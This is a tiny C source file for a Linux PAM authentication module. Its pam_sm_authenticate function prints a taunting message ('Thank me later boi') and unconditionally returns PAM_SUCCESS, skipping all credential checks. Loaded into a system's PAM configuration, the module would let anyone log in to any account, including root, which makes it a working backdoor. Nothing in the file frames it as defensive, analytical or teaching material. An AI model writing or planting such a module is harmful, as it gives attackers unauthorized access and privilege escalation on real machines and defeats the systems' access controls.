#include <security/pam_modules.h>
#include <security/pam_appl.h>
#include <stdio.h>

#define PAM_SM_AUTH

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    printf("Thank me later boi\n");
    return PAM_SUCCESS;
}